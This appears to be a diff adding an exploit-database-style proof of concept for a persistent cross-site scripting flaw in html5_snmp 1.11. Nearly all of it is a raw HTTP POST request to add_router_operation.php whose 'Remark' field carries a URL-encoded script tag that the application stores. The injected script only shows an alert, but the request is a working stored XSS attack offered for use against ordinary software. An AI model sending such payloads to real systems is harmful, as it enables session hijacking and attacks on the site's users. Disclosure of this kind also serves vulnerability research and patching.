@@ -1,0 +1,27 @@
+# Exploit Title: html5_snmp 1.11 - 'Remark' Persistent Cross-Site Scripting
+# Date: 2019-11-01
+# Exploit Author: Cakes
+# Vendor Homepage: https://github.com/lolypop55/html5_snmp
+# Software Link: https://github.com/lolypop55/html5_snmp.git
+# Version: 1.11
+# Tested on: CentOS 7
+# CVE: N/A
+
+# PoC
+
+POST /add_router_operation.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/add_router.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 128
+Cookie: submenu1=block; showips=10; showurls=10; showreferers=10; PHPSESSID=9m6bv15esubafglv5cnbcha421
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+
+Router_ID=ID&Router_Name=Name&Router_IP=IP&String=STRING&Remark=%3Cscript%3Ealert%28%22test5%22%29%3B%3C%2Fscript%3E&Submit=Save
